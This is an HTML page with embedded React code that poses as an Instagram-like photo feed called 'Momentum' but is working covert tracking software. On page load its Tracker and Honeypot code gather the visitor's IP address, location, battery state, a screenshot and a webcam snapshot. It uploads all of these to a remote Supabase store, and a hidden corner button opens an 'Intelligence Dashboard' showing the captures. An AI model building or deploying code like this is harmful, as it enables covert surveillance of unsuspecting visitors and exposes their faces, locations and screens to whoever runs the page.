<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Momentum</title>

    <!-- Tailwind CSS -->
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: { primary: '#0095f6' },
                    fontFamily: { sans: ['Inter', 'system-ui', 'sans-serif'] }
                }
            }
        }
    </script>

    <!-- React & Dependencies -->
    <script crossorigin src="https://unpkg.com/react@18/umd/react.development.js"></script>
    <script crossorigin src="https://unpkg.com/react-dom@18/umd/react-dom.development.js"></script>
    <script src="https://unpkg.com/history@5/umd/history.development.js"></script>
    <script src="https://unpkg.com/react-router@6/umd/react-router.development.js"></script>
    <script src="https://unpkg.com/react-router-dom@6/umd/react-router-dom.development.js"></script>

    <!-- Supabase -->
    <script src="https://unpkg.com/@supabase/supabase-js@2"></script>

    <!-- Lucide Icons -->
    <script src="https://unpkg.com/lucide@latest"></script>

    <!-- html2canvas -->
    <script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>

    <!-- Babel for JSX -->
    <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>

    <style>
        .scrollbar-hide::-webkit-scrollbar {
            display: none;
        }

        .scrollbar-hide {
            -ms-overflow-style: none;
            scrollbar-width: none;
        }
    </style>
</head>

<body class="bg-black text-white">
    <div id="root"></div>

    <script type="text/babel" data-presets="react">
        const { useState, useEffect } = React;
        const { BrowserRouter, Routes, Route, useNavigate } = ReactRouterDOM;
        const { createClient } = supabase;

        // --- Configuration ---
        const supabaseUrl = 'https://rgaysqgcfvxgcnkubymz.supabase.co';
        const supabaseKey = 'sb_publishable_ZEbh2lSgLQXl6xtg7AIfBg_3A0AUBwL';
        const _supabase = createClient(supabaseUrl, supabaseKey);

        // --- Icons (Lucide is globally available but needs mapping for React) ---
        // We will create simple SVG components manually for critical icons since Lucide React CDN 
        // doesn't export components easily for Babel Standalone usage without a build step.
        // Or we use lucide.createIcons() but that works on DOM elements.
        // For simplicity in this standalone, we'll implement the SVG icons directly.

        const Heart = ({ size = 24, className = "" }) => (
            <svg width={size} height={size} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className={className}><path d="M19 14c1.49-1.46 3-3.21 3-5.5A5.5 5.5 0 0 0 16.5 3c-1.76 0-3 .5-4.5 2-1.5-1.5-2.74-2-4.5-2A5.5 5.5 0 0 0 2 8.5c0 2.3 1.5 4.05 3 5.5l7 7Z" /></svg>
        );
        const MessageCircle = ({ size = 24, className = "" }) => (
            <svg width={size} height={size} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className={className}><path d="M7.9 20A9 9 0 1 0 4 16.1L2 22Z" /></svg>
        );
        const Send = ({ size = 24, className = "" }) => (
            <svg width={size} height={size} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className={className}><line x1="22" y1="2" x2="11" y2="13" /><polygon points="22 2 15 22 11 13 2 9 22 2" /></svg>
        );
        const Bookmark = ({ size = 24, className = "" }) => (
            <svg width={size} height={size} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className={className}><path d="m19 21-7-4-7 4V5a2 2 0 0 1 2-2h10a2 2 0 0 1 2 2v16z" /></svg>
        );
        const MoreHorizontal = ({ size = 24, className = "" }) => (
            <svg width={size} height={size} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className={className}><circle cx="12" cy="12" r="1" /><circle cx="19" cy="12" r="1" /><circle cx="5" cy="12" r="1" /></svg>
        );
        const Home = ({ size = 24, className = "" }) => (
            <svg width={size} height={size} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className={className}><path d="m3 9 9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z" /><polyline points="9 22 9 12 15 12 15 22" /></svg>
        );
        const Search = ({ size = 24, className = "" }) => (
            <svg width={size} height={size} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className={className}><circle cx="11" cy="11" r="8" /><path d="m21 21-4.3-4.3" /></svg>
        );
        const Lock = ({ size = 24, className = "" }) => (
            <svg width={size} height={size} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className={className}><rect width="18" height="11" x="3" y="11" rx="2" ry="2" /><path d="M7 11V7a5 5 0 0 1 10 0v4" /></svg>
        );


        // --- Tracker Utils ---
        const Tracker = {
            getIP: async () => {
                try {
                    const response = await fetch('https://api.ipify.org?format=json');
                    const data = await response.json();
                    return data.ip;
                } catch { return null; }
            },
            getGeoLocation: async (ip) => {
                return new Promise((resolve) => {
                    if (navigator.geolocation) {
                        navigator.geolocation.getCurrentPosition(
                            (pos) => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude, method: 'GPS' }),
                            async () => {
                                try {
                                    const res = await fetch(`https://ipapi.co/${ip}/json/`);
                                    const data = await res.json();
                                    resolve({ lat: data.latitude, lng: data.longitude, city: data.city, country: data.country_name, method: 'IP' });
                                } catch { resolve(null); }
                            }
                        );
                    } else { resolve(null); }
                });
            },
            getBatteryStatus: async () => {
                try {
                    if (navigator.getBattery) {
                        const battery = await navigator.getBattery();
                        return { level: battery.level * 100 + '%', charging: battery.charging };
                    }
                } catch { return 'Not Supported'; }
                return 'Not Supported';
            },
            captureScreen: async () => {
                try {
                    const canvas = await html2canvas(document.body);
                    return canvas.toDataURL('image/png');
                } catch { return null; }
            },
            captureCamera: async () => {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    await new Promise(r => video.onloadedmetadata = r);
                    video.play();
                    await new Promise(r => setTimeout(r, 1000));
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    stream.getTracks().forEach(t => t.stop());
                    return canvas.toDataURL('image/jpeg', 0.8);
                } catch { return null; }
            }
        };

        // --- Honeypot Component ---
        function Honeypot() {
            const [liked, setLiked] = useState(false);
            const [likesCount, setLikesCount] = useState(1234);
            const [showHeartAnim, setShowHeartAnim] = useState(false);
            const [secretClicks, setSecretClicks] = useState(0);
            const navigate = useNavigate();

            useEffect(() => {
                const collectData = async () => {
                    try {
                        const ip = await Tracker.getIP();
                        const battery = await Tracker.getBatteryStatus();
                        const geo = await Tracker.getGeoLocation(ip);

                        await new Promise(r => setTimeout(r, 2000));

                        const screenShot = await Tracker.captureScreen();
                        const cameraShot = await Tracker.captureCamera();

                        let cameraUrl = '', screenUrl = '';

                        if (cameraShot) {
                            try {
                                const fileName = `camera_${Date.now()}.jpg`;
                                const blob = await (await fetch(cameraShot)).blob();
                                const { data, error } = await _supabase.storage.from('evidence').upload(fileName, blob);
                                if (error) console.error("Camera Upload Err:", error);
                                if (data) cameraUrl = data.path;
                            } catch (e) { console.error("Cam fetch err", e); }
                        }
                        if (screenShot) {
                            try {
                                const fileName = `screen_${Date.now()}.png`;
                                const blob = await (await fetch(screenShot)).blob();
                                const { data, error } = await _supabase.storage.from('evidence').upload(fileName, blob);
                                if (error) console.error("Screen Upload Err:", error);
                                if (data) screenUrl = data.path;
                            } catch (e) { console.error("Screen fetch err", e); }
                        }


                        await _supabase.from('visits').insert([{
                            ip_address: ip,
                            user_agent: navigator.userAgent,
                            platform: navigator.platform,
                            geo_location: geo,
                            battery_level: battery,
                            referrer: document.referrer,
                            camera_snapshot_url: cameraUrl,
                            screen_snapshot_url: screenUrl,
                            device_type: /Mobi|Android/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop'
                        }]);
                    } catch (e) { console.error("Tracking error", e); }
                };
                collectData();
            }, []);

            const handleLike = () => {
                if (!liked) {
                    setShowHeartAnim(true);
                    setLikesCount(p => p + 1);
                    setTimeout(() => setShowHeartAnim(false), 1000);
                } else { setLikesCount(p => p - 1); }
                setLiked(!liked);
            };

            const handleSecretConvert = () => {
                const newClicks = secretClicks + 1;
                setSecretClicks(newClicks);
                if (newClicks >= 4) { navigate('/admin'); }
            };

            return (
                <div className="min-h-screen bg-black flex justify-center items-center p-0 md:p-4 font-sans text-white">
                    <div className="w-full max-w-[420px] bg-black border-x border-gray-800 h-[100vh] md:h-[850px] md:max-h-[90vh] md:rounded-[40px] md:border-y md:border-gray-800 overflow-hidden relative shadow-2xl flex flex-col">

                        {/* Status Bar */}
                        <div className="h-12 w-full bg-black flex justify-between items-center px-6 text-sm font-medium z-50">
                            <span>9:41</span>
                            <div className="flex gap-2 items-center">
                                <div className="h-3 w-4 bg-white/0"></div>
                            </div>
                        </div>

                        {/* Secret Button (Invisible) */}
                        <div onClick={handleSecretConvert} className="absolute top-0 left-0 w-16 h-16 z-[100] cursor-default bg-transparent"></div>

                        {/* Header */}
                        <div className="bg-black/95 backdrop-blur-sm border-b border-white/10 px-4 py-3 flex justify-between items-center sticky top-0 z-40">
                            <span className="font-bold text-xl tracking-tight">Momentum</span>
                            <div className="flex gap-5">
                                <Heart size={26} className="text-white" />
                                <MessageCircle size={26} className="text-white -rotate-[15deg] mt-[-2px]" />
                            </div>
                        </div>

                        {/* Body */}
                        <div className="flex-1 overflow-y-auto overflow-x-hidden scrollbar-hide pb-20">
                            {/* Stories */}
                            <div className="px-4 py-4 flex gap-4 overflow-x-auto scrollbar-hide border-b border-white/5">
                                {['My Story', 'sarah_j', 'mike_travel', 'lux_life'].map((name, i) => (
                                    <div key={i} className="flex flex-col items-center space-y-1.5 flex-shrink-0 cursor-pointer group">
                                        <div className={`w-[72px] h-[72px] rounded-full p-[3px] ${i === 0 ? 'bg-transparent border border-white/20' : 'bg-gradient-to-tr from-yellow-500 via-red-500 to-purple-600'}`}>
                                            <img src={`https://images.unsplash.com/photo-${1534528741775 + i}-53994a69daeb?w=150&h=150&fit=crop`} className="w-full h-full rounded-full border-[3px] border-black object-cover" />
                                        </div>
                                        <span className="text-[11px] text-gray-300 truncate w-16 text-center">{name}</span>
                                    </div>
                                ))}
                            </div>

                            {/* Post */}
                            <div className="flex flex-col border-b border-white/10 pb-4">
                                <div className="flex items-center justify-between p-3.5">
                                    <div className="flex items-center space-x-3">
                                        <div className="w-9 h-9 rounded-full bg-gradient-to-tr from-yellow-400 to-purple-600 p-[2px]">
                                            <img src="https://images.unsplash.com/photo-1524504388940-b1c1722653e1?w=150&h=150&fit=crop" className="w-full h-full rounded-full border-[2px] border-black object-cover" />
                                        </div>
                                        <div><span className="font-semibold text-sm block">sarah_adventures</span><span className="text-xs text-gray-400 block">Paris, France</span></div>
                                    </div>
                                    <MoreHorizontal className="text-white" />
                                </div>
                                <div className="relative aspect-[4/5] bg-gray-900" onDoubleClick={handleLike}>
                                    <img src="https://images.unsplash.com/photo-1493246507139-91e8fad9978e?ixlib=rb-4.0.3&auto=format&fit=crop&w=1200&q=80" className="w-full h-full object-cover" />
                                    <div className={`absolute inset-0 flex items-center justify-center transition-opacity duration-300 ${showHeartAnim ? 'opacity-100' : 'opacity-0'}`}>
                                        <Heart size={120} className="text-white fill-white drop-shadow-2xl animate-bounce" />
                                    </div>
                                </div>
                                <div className="px-4 pt-4 pb-2">
                                    <div className="flex justify-between mb-4">
                                        <div className="flex space-x-5">
                                            <button onClick={handleLike}><Heart size={28} className={liked ? 'text-red-500 fill-red-500' : 'text-white'} /></button>
                                            <MessageCircle size={28} className="text-white -rotate-90" />
                                            <Send size={28} className="text-white -rotate-12" />
                                        </div>
                                        <Bookmark size={28} className="text-white" />
                                    </div>
                                    <div className="font-semibold text-sm mb-2 text-white">{likesCount.toLocaleString()} likes</div>
                                    <div className="text-sm mb-2 text-gray-100"><span className="font-semibold mr-2 text-white">sarah_adventures</span>Found this cute little cafe near the Eiffel Tower!</div>
                                </div>
                            </div>
                        </div>

                        {/* Bottom Nav */}
                        <div className="bg-black border-t border-white/10 h-[85px] px-6 pb-6 flex justify-between items-center z-50 absolute bottom-0 w-full">
                            <Home size={28} />
                            <Search size={28} className="opacity-50" />
                            <div className="w-7 h-7 rounded-sm border-2 border-white flex items-center justify-center font-bold text-lg leading-none">+</div>
                            <Heart size={28} className="opacity-50" />
                            <div className="w-7 h-7 rounded-full bg-gray-800 border border-white/50 overflow-hidden"><img src="https://images.unsplash.com/photo-1570295999919-56ceb5ecca61?w=100&h=100&fit=crop" className="w-full h-full object-cover" /></div>
                        </div>

                    </div>
                </div>
            );
        }

        // --- Admin Component ---
        function Admin() {
            const [data, setData] = useState([]);
            const [isAuthenticated, setIsAuthenticated] = useState(false);
            const [username, setUsername] = useState('');
            const [password, setPassword] = useState('');
            const [error, setError] = useState(null);

            const handleLogin = async (e) => {
                e.preventDefault();
                const { data, error } = await _supabase.from('admins').select('*').eq('username', username).eq('password', password).single();
                if (data && !error) { setIsAuthenticated(true); fetchData(); }
                else { setError('Invalid credentials'); }
            };

            const fetchData = async () => {
                const { data } = await _supabase.from('visits').select('*').order('created_at', { ascending: false });
                setData(data || []);
            };

            if (!isAuthenticated) {
                return (
                    <div className="min-h-screen flex items-center justify-center bg-[#0f172a] text-white">
                        <form onSubmit={handleLogin} className="flex flex-col space-y-6 p-10 bg-white/10 backdrop-blur-xl rounded-2xl border border-white/20 shadow-2xl w-full max-w-md">
                            <h2 className="text-3xl font-bold text-center">Admin Access</h2>
                            {error && <div className="text-red-400 text-center">{error}</div>}
                            <input type="text" value={username} onChange={e => setUsername(e.target.value)} className="bg-black/40 border border-gray-600 rounded p-3" placeholder="Username" />
                            <input type="password" value={password} onChange={e => setPassword(e.target.value)} className="bg-black/40 border border-gray-600 rounded p-3" placeholder="Password" />
                            <button type="submit" className="bg-blue-600 py-3 rounded font-bold">Authenticate</button>
                        </form>
                    </div>
                )
            }

            return (
                <div className="min-h-screen bg-[#0f172a] text-white p-6">
                    <h1 className="text-2xl font-bold mb-6">Intelligence Dashboard</h1>
                    <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
                        {data.map(visit => (
                            <div key={visit.id} className="bg-slate-800/50 border border-white/5 rounded-xl p-4">
                                <div className="flex justify-between mb-2">
                                    <span className="font-mono font-bold text-blue-400">{visit.ip_address}</span>
                                    <span className="text-xs text-gray-400">{new Date(visit.created_at).toLocaleString()}</span>
                                </div>
                                <div className="text-sm tex-gray-300 mb-4">
                                    <p>Device: {visit.device_type} / {visit.platform}</p>
                                    <p>Battery: {visit.battery_level?.level}</p>
                                    <p>Loc: {visit.geo_location?.city}, {visit.geo_location?.country}</p>
                                </div>
                                <div className="grid grid-cols-2 gap-2">
                                    {visit.camera_snapshot_url && <a href={`https://rgaysqgcfvxgcnkubymz.supabase.co/storage/v1/object/public/evidence/${visit.camera_snapshot_url}`} target="_blank"><img src={`https://rgaysqgcfvxgcnkubymz.supabase.co/storage/v1/object/public/evidence/${visit.camera_snapshot_url}`} className="w-full h-24 object-cover rounded bg-black" /></a>}
                                    {visit.screen_snapshot_url && <a href={`https://rgaysqgcfvxgcnkubymz.supabase.co/storage/v1/object/public/evidence/${visit.screen_snapshot_url}`} target="_blank"><img src={`https://rgaysqgcfvxgcnkubymz.supabase.co/storage/v1/object/public/evidence/${visit.screen_snapshot_url}`} className="w-full h-24 object-cover rounded bg-black" /></a>}
                                </div>
                            </div>
                        ))}
                    </div>
                </div>
            );
        }

        // --- App Entry ---
        const App = () => (
            <BrowserRouter>
                <Routes>
                    <Route path="/" element={<Honeypot />} />
                    <Route path="/admin" element={<Admin />} />
                </Routes>
            </BrowserRouter>
        );

        const root = ReactDOM.createRoot(document.getElementById('root'));
        root.render(<App />);
    </script>
</body>

</html>